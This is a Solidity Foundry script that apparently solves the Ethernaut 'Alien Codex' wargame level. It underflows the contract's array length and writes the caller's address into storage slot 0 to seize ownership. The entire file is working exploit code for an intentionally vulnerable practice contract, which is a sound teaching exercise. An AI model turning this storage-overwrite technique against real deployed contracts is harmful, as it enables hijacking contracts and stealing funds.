// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/19_IAlienCodex.sol";
import "@oppenzeppelin/contracts/access/Ownable.sol";

address constant INSTANCE = 0xC9839B0985503Bc03a328888cFa8692cA7b103ef;

contract AlienCodexPOCScript is Script {
    IAlienCodex instance = IAlienCodex(INSTANCE);

    function run() external {
        vm.startBroadcast();

        instance.makeContact();
        instance.retract();
        instance.revise(
            type(uint256).max - uint256(keccak256(abi.encode(1))) + 1, bytes32(uint256(uint160(msg.sender)))
        );

        assert(Ownable(INSTANCE).owner() == msg.sender);

        vm.stopBroadcast();
    }
}
